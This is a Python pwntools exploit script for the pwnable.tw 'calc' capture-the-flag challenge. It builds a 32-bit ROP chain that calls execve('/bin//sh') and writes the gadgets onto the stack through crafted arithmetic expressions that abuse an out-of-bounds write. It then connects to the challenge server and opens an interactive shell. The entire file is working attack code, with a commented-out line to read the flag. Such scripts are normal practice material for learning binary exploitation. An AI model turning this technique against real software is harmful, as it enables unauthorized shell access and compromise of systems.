#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./calc")
    context.log_level = "debug"
    #  elf = ELF("./calc")
    #  libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    #  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

else:
    io = remote("chall.pwnable.tw", 10100)
    #  elf = ELF("")
    #  libc = ELF("")

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)


from struct import pack
# Padding goes here
p = ''
p+=p32(0x804967a)
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec064) # @ .data + 4
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080ec060) # padding without overwrite ebx
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x08049a21) # int 0x80

if __name__ == "__main__":
    for i in xrange(len(p) // 4 - 1):
        payload = "+ {} - {} + {}".format(369 + i, u32(p[i * 4: i * 4 + 4]), u32(p[i * 4 + 4: i * 4 + 8]))
        success("{}".format(payload))
        io.sendline(payload)

    io.sendline(" ")

    io.interactive()
    #  io.sendline("cat /home/calc/flag")
    #  print io.recvline_contains("FLAG")
    io.close()
